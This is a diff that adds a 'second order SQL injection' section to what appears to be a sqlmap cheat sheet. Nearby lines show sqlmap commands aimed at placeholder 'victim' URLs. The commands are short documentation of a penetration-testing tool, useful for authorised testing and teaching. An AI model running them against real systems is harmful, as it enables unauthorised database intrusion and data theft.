@@ -30,3 +30,11 @@ $ sqlmap -u "http://victim/vuln/vulnerabilities/sql_bind/" --data="id=1&Submit=S
 ```bash
 $ sqlmap -u "http://victim/.it" --crawl=1 --batch --threads=5
 ```
+
+### Testing 2nd order SQL Injection
+
+Save both injection and oracle HTTP requests and run:  
+
+```bash
+$ sqlmap -r injection.req --second-req=oracle.req --batch
+```
